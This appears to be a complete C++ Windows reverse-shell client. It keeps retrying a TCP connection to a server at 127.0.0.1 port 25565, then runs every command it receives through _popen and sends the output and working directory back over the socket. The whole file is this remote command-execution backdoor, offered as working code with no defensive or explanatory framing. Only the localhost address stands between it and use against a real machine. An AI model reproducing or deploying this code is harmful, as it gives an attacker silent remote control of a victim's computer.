#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <direct.h>
#include <array>
#pragma comment(lib, "ws2_32.lib")

using namespace std;
//b
void main()
{
	array<char, 128> buffer;
	string result;
	string commande;
	bool Boucleclient = true;
	string jesuisou;
	char strDir[129] = { 0 };
	bool connection = true;
	string ipAddress = "127.0.0.1";			// IP Address of the server
	int port = 25565;						// Listening port # on the server

	// Initialize WinSock
	WSAData data;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &data);
	if (wsResult != 0)
	{
		cerr << "Can't start Winsock, Err #" << wsResult << endl;
		return;
	}

	// Create socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
		WSACleanup();
		return;
	}
	

	// Fill in a hint structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

	// Connect to server
	
	while (connection == true)
	{
		int connResult = connect(sock, (sockaddr*)& hint, sizeof(hint));

		if (connResult != SOCKET_ERROR)
		{
			connection = false;
		}
	}


	// Do-while loop to send and receive data
	char buf[4096];
	string userInput;
	
	while (Boucleclient == true)
	{
		//Path
		result = "";
		jesuisou = _getcwd(strDir, 128);
		jesuisou = jesuisou + ">";
		send(sock, jesuisou.c_str(), jesuisou.size() + 1, 0);
		
		//popen
		int bytesReceived = recv(sock, buf, 4096, 0);
		commande = string(buf, 0, bytesReceived);

		commande = commande + " 2>&1";

		FILE* pipe = _popen(commande.c_str(), "r");

		while (fgets(buffer.data(), 128, pipe) != NULL) {
			result += buffer.data();
		}
		auto returnCode = _pclose(pipe);

		//popen stderr/stdin
		int sendResult = send(sock, result.c_str(), result.size() + 1, 0);

	
	} 

	// Gracefully close down everything
	closesocket(sock);
	WSACleanup();
}
